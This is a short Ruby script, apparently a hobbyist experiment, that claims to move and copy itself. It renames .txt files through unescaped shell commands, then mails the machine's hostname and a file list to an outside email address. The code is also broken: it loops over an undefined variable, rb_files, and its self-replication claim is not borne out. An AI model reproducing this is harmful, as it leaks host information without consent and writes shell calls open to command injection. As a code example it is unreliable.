###### Extremely Dangerous!! Proceed with extreme caution!!!!! ##########

# This file knows about itself, it can mov itslef where ever it pleases and can make copies of itslef. AWESOME!!!!!

folder = "."
txt_files = []
txt_files = Dir.glob("#{folder}/**/*.txt")

rb_files.each { |file| system("mv #{file} updated_#{file}") }

puts Dir.glob("*.txt")
puts "Changing them back to the original form..."

rb_files.each { |file| system("mv updated_#{file} #{file}")}

computer = `echo $HOSTNAME`

system("echo '#{rb_files} created in #{computer}' | mail -s 'Third try' stbarrientos@gmail.com")
